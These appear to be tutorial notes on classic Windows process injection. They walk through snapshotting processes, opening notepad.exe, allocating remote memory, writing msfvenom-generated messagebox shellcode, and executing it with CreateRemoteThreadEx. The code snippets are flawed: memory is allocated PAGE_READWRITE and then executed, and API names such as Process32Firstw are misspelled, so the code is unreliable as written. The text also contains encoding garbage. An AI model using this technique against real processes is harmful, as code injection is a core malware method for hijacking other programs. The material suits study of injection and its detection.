NECESSARY FUNCTIONS FOR PROCESS INJECTION
-------------------------------------------
If we are going to work with #include <tlhelp32.h>, we will use:

CreateToolhelp32Snapshot â€” to take a snapshot of the processes.

Process32Firstw â€” to retrieve info about the first process.

Process32Nextw â€” to iterate over remaining processes.

OpenProcess â€” to get a handle to the target process.

VirtualAllocEx â€” to allocate memory in the target process.

WriteProcessMemory â€” to inject shellcode.

CreateRemoteThreadEx â€” to execute the shellcode.

SNAPSHOT CREATION & PROCESS ITERATION
-------------------------------------
HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

This calls a Windows API function to create a snapshot of all currently running processes in the system.

- TH32CS_SNAPPROCESS: tells Windows you want to take a snapshot of the process list.
- 0: means "give me all processes" 
  (the second parameter can specify a specific PID if you're taking snapshots of threads or modules, but for processes, it's always 0).

CreateToolhelp32Snapshot() returns a HANDLE â€” basically a reference to a kernel object.

That handle lets you iterate through the list of processes using:

    Process32Firstw(snapshot, &pe32);
    Process32Nextw(snapshot, &pe32);

These functions fill in the pe32 structure with info about each process: PID, exe name, parent PID, etc.

PROCESS32FIRSTW & PROCESS32NEXTW
-------------------------------
Process32Firstw() and Process32Nextw() are used to retrieve information about processes in the system.
- Process32Firstw() retrieves information about the first process in the snapshot.
- Process32Nextw() retrieves information about the next process in the snapshot.
- Both functions fill a PROCESSENTRY32 structure with details about the process, such as its ID, name, and other attributes.
  BOOL Process32Firstw(
  [in]      HANDLE           hSnapshot, //A handle to the snapshot returned from a previous call to the CreateToolhelp32Snapshot function.
  [in, out] LPPROCESSENTRY32 lppe //A pointer to a PROCESSENTRY32 structure. It contains process information

); 
exsample:
Process32Firstw(hSnapshot, &pe32);

PROCESSENTRY32 STRUCTURE & SIZE
-------------------------------
pe32.dwSize = sizeof(PROCESSENTRY32);

How is the sizeof calculated?
sizeof is a compile-time operator.  
It returns the total number of bytes occupied by the type PROCESSENTRY32.

This structure is defined as:
typedef struct tagPROCESSENTRY32 {
    DWORD dwSize; // Size of the structure, must be set before calling Process32FirstW or Process32NextW
    DWORD cntUsage; // Count of times the process is used (not always relevant)
    DWORD th32ProcessID; // Unique identifier for the process 
    ULONG_PTR th32DefaultHeapID; // Default heap ID for the process
    DWORD th32ModuleID; 
    DWORD cntThreads; // Number of threads in the process
    DWORD th32ParentProcessID;
    LONG pcPriClassBase;
    DWORD dwFlags;
    TCHAR szExeFile[MAX_PATH]; // Name of the executable file for the process
} PROCESSENTRY32;

So sizeof(PROCESSENTRY32) will compute the total size of all those fields.

COMPARING PROCESS NAMES
-----------------------------
here we will be using wcscmp() to compare the process name with a target name.
int wcscmp(
   const wchar_t *string1,
   const wchar_t *string2
);
- wcscmp() compares two wide-character strings.
- It returns 0 if the strings are equal, a negative value if string1 is less than string2, and a positive value if string1 is greater than string2.
- In our case, we use it to check if the process name matches "notepad.exe" (or any other target process name).
- If the comparison returns 0, it means the process name matches, and we can proceed

exsample:
if (wcscmp(pe32.szExeFile, L"notepad.exe") == 0) {
    // Process name matches, proceed with injection
}

OPENING A PROCESS
-----------------
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,   // Specifies the access rights requested for the process (e.g., read, write, terminate).
  [in] BOOL  bInheritHandle,    // If TRUE, the returned handle can be inherited by child processes; if FALSE, it cannot.
  [in] DWORD dwProcessId        // The unique identifier (ID) of the process to open.
);

- If the function succeeds, the return value is an open handle to the specified process.
- If the function fails, the return value is NULL.
exsample:
HANDLE hProcess = OpenProcess(
    PROCESS_ALL_ACCESS, // Requesting all access rights
    FALSE,              // Handle cannot be inherited
    pe32.th32ProcessID  // Process ID of the target process
);
if (hProcess == NULL) {
    error("Failed to open process: %lu", GetLastError());
    return EXIT_FAILURE;
} else {
    okay("Successfully opened process with PID %lu", pe32.th32ProcessID);
}

MEMORY ALLOCATION IN REMOTE PROCESS
-----------------------------------
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,         // Handle to the process where memory will be allocated.
  [in, optional] LPVOID lpAddress,        // Starting address for the allocation. If NULL, the system picks.
  [in]           SIZE_T dwSize,           // Size of the memory block to allocate.
  [in]           DWORD  flAllocationType, // Type of allocation (e.g., MEM_COMMIT).
  [in]           DWORD  flProtect         // Memory protection (e.g., PAGE_READWRITE).
);

- If the function succeeds, the return value is a pointer to the allocated memory.
- If the function fails, the return value is NULL.
exsample:
rAlloc_mem = VirtualAllocEx(hProcess, NULL, sizeof(ShellCode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
if (rAlloc_mem == NULL) {
    error("Failed to allocate memory in target process: %lu", GetLastError());
    return EXIT_FAILURE;
} else {
    okay("Successfully allocated memory in target process at address %p", rAlloc_mem);
}

WRITING SHELLCODE INTO PROCESS MEMORY
-------------------------------------
BOOL WriteProcessMemory(
  [in] HANDLE hProcess, // Handle to the process where memory will be written.
  [in] LPVOID lpBaseAddress, // Pointer to the base address in the target process where memory will be written.
  [in] LPCVOID lpBuffer,// Pointer to the buffer containing the data to write.
  [in] SIZE_T nSize, // Size of the data to write, in bytes.
  [out, optional] SIZE_T *lpNumberOfBytesWritten // Optional pointer to a variable that receives the number of bytes written.
);

Example:
```c
  if (WriteProcessMemory(hProcess, rAlloc_mem, ShellCode, sizeof(ShellCode), NULL)) {
      okay("Successfully wrote to process memory");
  } else {
      error("Failed to write to process memory: %lu", GetLastError());
      return EXIT_FAILURE;
  }

CREATING A REMOTE THREAD
-------------------------
this function creates a thread in the specified process, allowing us to execute code in the context of that process.
a thread is a lightweight process that can run concurrently with other threads in the same process.
we can see it as a way to run our shellcode in the target process.
a remote thread is a thread that runs in the address space of another process, which is what we need for process injection.

CreateRemoteThreadEx(
[in] HANDLE hProcess, // Handle to the target process where the thread will be created.
[in, optional] LPSECURITY_ATTRIBUTES lpThreadAttributes, // Pointer to a SECURITY_ATTRIBUTES structure that determines whether the returned handle can be inherited by child processes.
[in] SIZE_T dwStackSize,  // Initial size of the stack for the new thread. If 0, the default size is used.
[in] LPTHREAD_START_ROUTINE lpStartAddress, // Pointer to the function to be executed by the thread. This is where our shellcode will be executed.
[in, optional] LPVOID lpParameter, // Pointer to a variable to be passed to the thread function. This can be NULL if no parameters are needed.
[in] DWORD dwCreationFlags, // Flags that control the creation of the thread (e.g., CREATE_SUSPENDED to create the thread in a suspended state).
[out, optional] LPDWORD lpThreadId // Pointer to a variable that receives the thread identifier. This can be NULL if you don't need the ID.
);

Note:
In (LPTHREAD_START_ROUTINE)rAlloc_mem, the cast is needed because CreateRemoteThread expects a function pointer of type LPTHREAD_START_ROUTINE.

To put it simply:
We're telling the system,
ðŸ‘‰ â€œTreat this address (rAlloc_mem) as a pointer to a function you can run as a thread.â€

This is required because CreateRemoteThread wonâ€™t accept just any address â€” it needs to know it's a callable function.

In dwCreationFlags, we can use 0 to create the thread in a normal state, or CREATE_SUSPENDED if we want to create it in a suspended state (not running immediately).


Example:
  HANDLE hThread = CreateRemoteThreadEx(
      hProcess, 
      NULL, 
      0, 
      (LPTHREAD_START_ROUTINE)rAlloc_mem, 
      NULL, 
      0, 
      NULL
  );

  if (hThread == NULL) {
      error("Failed to create remote thread: %lu", GetLastError());
      return EXIT_FAILURE;
  } else {
      okay("Successfully created remote thread");
  }

CLEANING UP and WAITING FOR THREAD TO FINISH
-----------------------------------------
we will use WaitForSingleObject to wait for the remote thread to finish executing.
  WaitForSingleObject(hThread, INFINITE);
  DWORD WaitForSingleObject(
  [in] HANDLE hHandle, // Handle to the object to wait for (in this case, the remote thread).
  [in] DWORD  dwMilliseconds // Time-out interval in milliseconds. INFINITE means wait indefinitely.
  );

now for VirtualFreeEx, we will use it to free the allocated memory in the target process after we're done with it.
  VirtualFreeEx(hProcess, rAlloc_mem, 0, MEM_RELEASE);
  BOOL VirtualFreeEx(
  [in] HANDLE hProcess, // Handle to the target process.
  [in] LPVOID lpAddress, // Pointer to the base address of the memory to free.
  [in] SIZE_T dwSize, // Size of the memory to free. If 0, the entire region is freed.
  [in] DWORD dwFreeType // Type of free operation (e.g., MEM_RELEASE).
  );

Finally, we close the handles to clean up resources:
  CloseHandle(hThread);
  CloseHandle(hProcess);

GENERATING SHELLCODE (KALI)
----------------------------
msfvenom -p windows/x64/messagebox TEXT="I Licked Herta" TITLE="Injected" -f c --var-name=ShellCode

FINDING PROCESS ID (PID) OF NOTEPAD
------------------------------------
PS> notepad
PS> tasklist | findstr /i notepad

tasklist lists all the processes.

findstr /i notepad filters the list for the notepad process.

If notepad is running, the output will look like:
Notepad.exe                  22248 Console                    1   101 888 Ko

